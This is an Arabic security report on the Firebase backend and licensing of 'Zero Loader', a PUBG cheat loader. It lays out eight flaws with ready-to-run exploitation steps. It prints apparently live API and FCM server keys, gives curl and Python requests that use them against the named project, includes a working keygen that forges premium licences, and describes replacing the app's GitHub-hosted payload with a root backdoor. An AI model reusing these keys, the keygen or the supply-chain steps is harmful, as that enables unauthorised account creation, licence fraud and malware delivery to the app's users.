# تقرير تفصيلي: ثغرات Firebase الأمنية وكيفية استغلالها
**التطبيق:** Zero Loader V4.4.01
**مشروع Firebase:** wolf-e99fb
**تاريخ الفحص:** 5 يوليو 2026

---

## ملخص الثغرات المكتشفة

| الثغرة | الخطورة | قابلة للاستغلال | التأثير |
|--------|---------|-----------------|---------|
| إساءة استخدام المصادقة المجهولة | عالية | نعم | استنزاف الموارد، حسابات وهمية |
| تسريب البيانات العامة (`/aplikasi`) | متوسطة-عالية | نعم | تسريب معلومات |
| مفتاح API مكشوف (Hardcoded) | عالية | نعم | عمليات مصادقة |
| تشفير AES ضعيف (الترخيص) | حرجة | نعم | تخطي كامل لنظام الترخيص |
| مفتاح FCM Server مكشوف | عالية | جزئياً | API قديم تم إيقافه |
| تحميل الحمولات بدون تحقق | عالية | نعم | هجوم سلسلة التوريد |
| متجه تهيئة صفري (Zero IV) | عالية | نعم | تشفير حتمي |
| غياب Certificate Pinning | متوسطة | نعم | هجمات MITM |

---

## الثغرة الأولى: إساءة استخدام المصادقة المجهولة (Anonymous Auth Abuse)

### التصنيف
- **CWE-287:** Improper Authentication
- **CVSS Score:** 7.5 (High)

### الوصف التقني
مشروع Firebase (`wolf-e99fb`) يسمح بإنشاء حسابات مجهولة (Anonymous Accounts) بدون أي قيود. هذا يعني أن أي شخص يملك مفتاح API يمكنه إنشاء عدد غير محدود من الحسابات.

### كيفية الاستغلال

```bash
# إنشاء حساب مجهول عبر REST API
curl -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAOrhEU4gPb1cij7NTjVvdnx6cOwcy4UKE" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}'
```

### نتيجة الاستغلال (مثبتة)
```json
{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJhbGciOiJSUzI1NiIs...",
  "refreshToken": "AMf-vBw...",
  "expiresIn": "3600",
  "localId": "aSqwDAfSrCZa4KfxX6yGrEhi63y1"
}
```

### التأثير
- استنزاف حصة Firebase المجانية (10,000 مصادقة/شهر في الخطة المجانية).
- تلويث قاعدة بيانات المستخدمين بحسابات وهمية.
- إذا كانت قواعد الأمان تعتمد على `auth.uid != null` فقط (بدون تحقق إضافي)، يمكن الوصول لبيانات محمية.

---

## الثغرة الثانية: تسريب البيانات العامة (Public Data Disclosure)

### التصنيف
- **CWE-200:** Exposure of Sensitive Information
- **CVSS Score:** 5.3 (Medium)

### الوصف التقني
عقدة `/aplikasi` في قاعدة بيانات Firebase Realtime Database مفتوحة للقراءة للجميع **بدون أي مصادقة**. لا تحتاج حتى لمفتاح API للوصول إليها.

### كيفية الاستغلال

```bash
# قراءة البيانات بدون أي مصادقة
curl "https://wolf-e99fb-default-rtdb.firebaseio.com/aplikasi.json"
```

### البيانات المسربة

```json
{
  "G1": {
    "id": 0,
    "package": "com.tencent.ig",
    "status": " Safe/أمن",
    "title": "PUBG GLOBAL",
    "version": "4.4"
  },
  "G2": {
    "id": 1,
    "package": "com.pubg.krmobile",
    "status": " Safe/أمن",
    "title": "PUBG KOREA",
    "version": "4.4"
  },
  "G3": {
    "id": 2,
    "package": "com.vng.pubgmobile",
    "status": "Safe/أمن",
    "title": "PUBG VIETNAM",
    "version": "4.4"
  },
  "G4": {
    "id": 3,
    "package": "com.rekoo.pubgm",
    "status": "Safe/أمن",
    "title": "PUBG TAIWAN",
    "version": "4.4"
  },
  "G5": {
    "id": 4,
    "package": "com.pubg.imobile",
    "status": "Safe",
    "title": "PUBG INDIA",
    "version": "3.9"
  }
}
```

### التأثير
- كشف الألعاب المدعومة وإصداراتها.
- كشف حالة الأمان (هل نظام الحماية يكتشف الغش أم لا).
- يسمح للمنافسين بمراقبة حالة الأداة.
- معلومات مفيدة لفرق مكافحة الغش لتتبع هذه الأداة.

---

## الثغرة الثالثة: مفتاح API مكشوف (Hardcoded API Key)

### التصنيف
- **CWE-798:** Use of Hard-coded Credentials
- **CVSS Score:** 7.5 (High)

### الوصف التقني
مفتاح Firebase API مخزن داخل كود التطبيق ومشفر بخوارزمية `LSParanoid` الضعيفة التي تم كسرها بالكامل. كما أن مفتاح FCM Server Key مخزن بنفس الطريقة.

### البيانات المكشوفة

| المفتاح | القيمة |
|---------|--------|
| Firebase API Key | `AIzaSyAOrhEU4gPb1cij7NTjVvdnx6cOwcy4UKE` |
| Firebase Project ID | `wolf-e99fb` |
| Project Number | `183662681739` |
| Database URL | `https://wolf-e99fb-default-rtdb.firebaseio.com` |
| FCM Server Key | `AAAAPtHITYM:APA91bFkK42E4XGNwXpF0eKcnl8a6VX6rFG1mfVxwF9wTmjzVM5MQcC6sBUgTRcisZweWbcCeiDBFzpM2YFX8TE4pMtgw9bF5-aFVcAzPlZiy-ausbD0uVfqUdf43827qzMPRsxHNj0K` |
| Authorized Domains | `localhost`, `wolf-e99fb.firebaseapp.com`, `wolf-e99fb.web.app` |

### كيفية الاستغلال

```python
# استخراج إعدادات المشروع
import requests
url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig"
resp = requests.get(url, params={"key": "AIzaSyAOrhEU4gPb1cij7NTjVvdnx6cOwcy4UKE"})
print(resp.json())
# النتيجة: projectId, authorizedDomains, idpConfig
```

### التأثير
- تنفيذ عمليات مصادقة (إنشاء حسابات، تسجيل دخول).
- فحص طرق تسجيل الدخول المتاحة لأي بريد إلكتروني.
- الوصول لأي بيانات مقروءة علنياً.
- إذا لم يكن المفتاح مقيداً: إمكانية استخدامه لخدمات Google أخرى.

---

## الثغرة الرابعة: تشفير AES ضعيف (الأخطر)

### التصنيف
- **CWE-327:** Use of a Broken or Risky Cryptographic Algorithm
- **CWE-329:** Not Using an Unpredictable IV with CBC Mode
- **CVSS Score:** 9.8 (Critical)

### الوصف التقني
نظام الترخيص يعتمد على تشفير AES-CBC مع مفتاح ثابت ومتجه تهيئة (IV) صفري. هذا يجعل التشفير **حتمياً** (Deterministic) - نفس النص العادي ينتج دائماً نفس النص المشفر.

### التفاصيل التشفيرية

| المعامل | القيمة |
|---------|--------|
| الخوارزمية | AES/CBC/PKCS7Padding |
| مصدر المفتاح | SHA-256 لكلمة `"Activity"` |
| المفتاح (Hex) | `38da1505ca8373288489495101b14f24ac95078f520ad64df18272aa6054f750` |
| متجه التهيئة (IV) | `00000000000000000000000000000000` (16 بايت صفر) |

### كيفية الاستغلال (Keygen كامل)

```python
import hashlib, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# نفس المفتاح المستخدم في التطبيق
key = hashlib.sha256(b"Activity").digest()
iv = b'\x00' * 16

def encrypt(plaintext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), 16))).decode()

# توليد ترخيص مدفوع مزيف
fake_license = {
    "Login": encrypt("true"),           # qWsqKM1rpjLI4iyPfVkoRw==
    "Key": encrypt("PREMIUM-KEY"),      # مفتاح مزيف
    "Status": encrypt("Active"),        # UwruBrte3Koehsy6xch1VA==
    "Period": encrypt("Lifetime"),      # CU8pzwN5lj/E1CG8Wdx+9A==
    "EXP": encrypt("2099-12-31"),       # CQR9PHK8aW5/cUDBmpwKgA==
    "MaxDevices": encrypt("99"),        # عدد أجهزة غير محدود
}
```

### نقاط الضعف المحددة
1. **مفتاح ثابت لجميع المستخدمين:** لا يوجد مفتاح فريد لكل مستخدم.
2. **IV صفري:** يجعل التشفير حتمياً (كلمة "true" دائماً = `qWsqKM1rpjLI4iyPfVkoRw==`).
3. **المفتاح مخزن في التطبيق:** يمكن استخراجه بسهولة.
4. **لا يوجد تدوير للمفاتيح:** نفس المفتاح منذ بداية التطبيق.
5. **لا يوجد حماية سلامة (Integrity):** لا HMAC ولا AEAD.

### التأثير
- **تخطي كامل لنظام الترخيص:** يمكن لأي شخص استخدام الغش مجاناً.
- **فك تشفير بيانات جميع المستخدمين:** إذا تم الوصول لقاعدة البيانات.
- **توليد مفاتيح Premium غير محدودة.**

---

## الثغرة الخامسة: مفتاح FCM Server مكشوف

### التصنيف
- **CWE-798:** Use of Hard-coded Credentials
- **CVSS Score:** 6.5 (Medium-High) - مخفف بسبب إيقاف API

### الوصف التقني
مفتاح خادم FCM (Firebase Cloud Messaging) مخزن في كود Java الخاص بالتطبيق (ملف `Api.java`). هذا المفتاح يسمح نظرياً بإرسال إشعارات Push لجميع مستخدمي التطبيق.

### الحالة الحالية
واجهة FCM Legacy API تم إيقافها رسمياً في يونيو 2024. عند الاختبار، أعاد الخادم HTTP 404. ومع ذلك، تسريب هذا المفتاح يمثل ممارسة أمنية سيئة جداً.

### التأثير المحتمل (لو كان API نشطاً)
- إرسال إشعارات مزيفة لجميع المستخدمين.
- هجمات تصيد (Phishing) عبر إشعارات "تحديث جديد".
- تشغيل إجراءات في التطبيق عن بُعد.

---

## الثغرة السادسة: تحميل الحمولات بدون تحقق من السلامة

### التصنيف
- **CWE-494:** Download of Code Without Integrity Check
- **CVSS Score:** 8.1 (High)

### الوصف التقني
التطبيق يقوم بتحميل ملفات الغش (Payloads) من مستودع GitHub عام بدون أي تحقق من سلامة الملفات (لا Hash، لا توقيع رقمي).

### روابط الحمولات المكشوفة

| الملف | الرابط | الحجم |
|-------|--------|-------|
| servernrot.zip | `https://github.com/uchihaaymane/files/releases/download/files/servernrot.zip` | 467,353 بايت |
| assets.zip | `https://github.com/uchihaaymane/files/releases/download/files/assets.zip` | 118,466 بايت |

### محتويات الحمولات

**servernrot.zip:**
- `sock` - شيطان قراءة الذاكرة (ARM32)
- `bypass` - أداة تخطي الحماية
- `loader/libpubgm.so` - مكتبة الحقن (xhook)

**assets.zip:**
- `sock64` - شيطان قراءة الذاكرة (ARM64)

### كيفية الاستغلال (هجوم سلسلة التوريد)
1. اختراق حساب GitHub (`uchihaaymane`).
2. استبدال `servernrot.zip` بنسخة خبيثة تحتوي على Backdoor.
3. جميع مستخدمي التطبيق سيحملون النسخة الخبيثة تلقائياً.
4. بما أن التطبيق يعمل بصلاحيات Root، فإن الـ Backdoor سيملك صلاحيات كاملة على الجهاز.

---

## الثغرة السابعة: غياب Certificate Pinning

### التصنيف
- **CWE-295:** Improper Certificate Validation
- **CVSS Score:** 5.9 (Medium)

### الوصف التقني
ملف `network_security_config.xml` لا يحتوي على Certificate Pinning. هذا يعني أن أي شخص على نفس الشبكة يمكنه اعتراض الاتصالات بين التطبيق و Firebase.

### التأثير
- اعتراض بيانات الترخيص المشفرة (ثم فكها باستخدام المفتاح المكشوف).
- اعتراض وتعديل الحمولات المحملة.
- سرقة توكنات المصادقة.

---

## خلاصة: سيناريو الهجوم الكامل

يمكن لمهاجم تنفيذ السيناريو التالي:

1. **استخراج المفاتيح:** فك تشفير LSParanoid واستخراج مفتاح AES ومفتاح API.
2. **إنشاء حساب مجهول:** استخدام API Key لإنشاء حساب Firebase.
3. **توليد ترخيص مزيف:** استخدام Keygen لتوليد بيانات ترخيص Premium.
4. **استخدام الغش مجاناً:** تعديل APK لحقن الترخيص المزيف محلياً.
5. **هجوم سلسلة التوريد (اختياري):** اختراق GitHub واستبدال الحمولات.

**النتيجة:** تخطي كامل لنظام الدفع واستخدام جميع ميزات الغش مجاناً، مع إمكانية تحويل التطبيق إلى أداة تجسس على المستخدمين الآخرين.
